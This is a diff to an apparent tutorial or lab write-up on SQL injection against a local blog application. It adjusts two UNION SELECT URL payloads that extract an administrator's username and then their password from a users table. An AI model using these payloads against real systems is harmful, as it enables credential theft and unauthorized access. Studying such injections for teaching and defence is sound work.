@@ -26,7 +26,7 @@ SELECT username FROM users WHERE isAdmin=1 LIMIT 1 OFFSET 0
 
 Injecting the query in the browser should look like this:
 ```shell
-http://localhost:8080/p/2 UNION SELECT 1,(SELECT username FROM users WHERE isAdmin=1 LIMIT 1 OFFSET 0),3,4,5,6,7,8,9/slug-name-post'
+http://localhost:8080/p/2 UNION SELECT 1,(SELECT username FROM users WHERE isAdmin=1 LIMIT 1 OFFSET 0),3,4,5,6,7,8,9,10/slug-name-post'
 ```
 
 
@@ -36,7 +36,7 @@ And we keep **increasing the OFFSET** value until we get a blank response.
 
 Let say we get **only one** administrator user, with **username='admin'**. Now we need to get the password:
 ```shell
-http://localhost:8080/p/2 UNION SELECT 1,(SELECT password FROM users WHERE username='admin' LIMIT 1 OFFSET 0),3,4,5,6,7,8,9/slug-name-post'
+http://localhost:8080/p/2 UNION SELECT 1,(SELECT password FROM users WHERE username='admin' LIMIT 1 OFFSET 0),3,4,5,6,7,8,9,10/slug-name-post'
 ```
 
 And we will get some string like this as result:
